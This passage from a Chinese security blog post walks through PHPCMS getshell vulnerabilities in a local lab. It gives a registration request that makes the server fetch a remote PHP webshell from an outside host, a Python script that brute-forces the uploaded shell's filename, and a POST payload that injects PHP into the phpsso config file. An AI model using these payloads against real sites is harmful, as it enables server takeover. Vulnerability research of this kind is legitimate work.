</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">&#34;jpg&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后利用<code>$upload_func($file, $newfile)</code>调用了<code>copy</code>从远程端拷贝文件到本地,因此成功在本地保留webshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.241.130:8080/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POST: dosubmit=1&amp;username=123&amp;nickname=123&amp;email=a@a.com&amp;password=123456&amp;modelid=1&amp;info[content]=src=http://a.com/a.php#a.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png" /></p>
<p>本地测试payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.241.130:8080/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POST: dosubmit=1&amp;username=123&amp;nickname=123&amp;email=a@a.com&amp;password=123456&amp;modelid=1&amp;info[content]=src=http://192.168.241.1:8000/a.php#a.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png" /></p>
<p>但由于<code>rand(100,999)</code>的存在,需要编写脚本去爆破才能得到具体的文件名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://192.168.241.130:8080/uploadfile/2022/0313/202203130533</span><span class="si">%s</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">49000</span><span class="p">,</span><span class="mi">50000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">%</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">100</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="phpsso_serverphpcmsmodulesadminsystemphp后台getshell">phpsso_server/phpcms/modules/admin/system.php后台getshell</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">uc</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dosubmit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filepath</span> <span class="o">=</span> <span class="nx">CACHE_PATH</span> <span class="o">.</span> <span class="s1">&#39;configs&#39;</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="s1">&#39;system.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$config</span> <span class="o">=</span> <span class="k">include</span> <span class="nv">$filepath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$uc_config</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php &#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">define(&#39;UC_CONNECT&#39;, &#39;mysql&#39;);</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$old</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&#34;&#39;</span><span class="si">$k</span><span class="s2">&#39;=&gt;&#39;&#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$config</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$config</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$v</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&#39;,&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$new</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&#34;&#39;</span><span class="si">$k</span><span class="s2">&#39;=&gt;&#39;</span><span class="si">$v</span><span class="s2">&#39;,&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$uc_config</span> <span class="o">.=</span> <span class="s2">&#34;define(&#39;&#34;</span> <span class="o">.</span> <span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&#39;, &#39;</span><span class="si">$v</span><span class="s2">&#39;);</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$old</span><span class="p">,</span> <span class="nv">$new</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$uc_config_filepath</span> <span class="o">=</span> <span class="nx">CACHE_PATH</span> <span class="o">.</span> <span class="s1">&#39;configs&#39;</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="s1">&#39;uc_config.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$uc_config_filepath</span><span class="p">,</span> <span class="nv">$uc_config</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ucenter&#39;</span><span class="p">,</span> <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="nx">array2string</span><span class="p">(</span><span class="nv">$data</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">showmessage</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;operation_success&#39;</span><span class="p">),</span> <span class="nx">HTTP_REFERER</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_one</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ucenter&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$r</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">string2array</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin_tpl</span><span class="p">(</span><span class="s1">&#39;system_uc&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.241.130:8080/phpsso_server/index.php?m=admin&amp;c=system&amp;a=uc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POST: dosubmit=1&amp;data[asdf&#39;,&#39;qwer&#39;);?&gt;&lt;?php phpinfo();?&gt;asdf]=asdf
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png" /></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2022-03-14</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/dedecms_v5.7_sp2/" class="prev" rel="prev" title="DeDeCMS_V5.7_SP2"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>DeDeCMS_V5.7_SP2</a>
            <a href="/thinkphp_v3/" class="next" rel="next" title="ThinkPHP_V3">ThinkPHP_V3<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="giscus" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOG4BtJM4CTls2","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"og:title","reactionsEnabled":"1","repo":"mi3aka/mi3aka.github.io","repoId":"R_kgDOG4BtJA"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
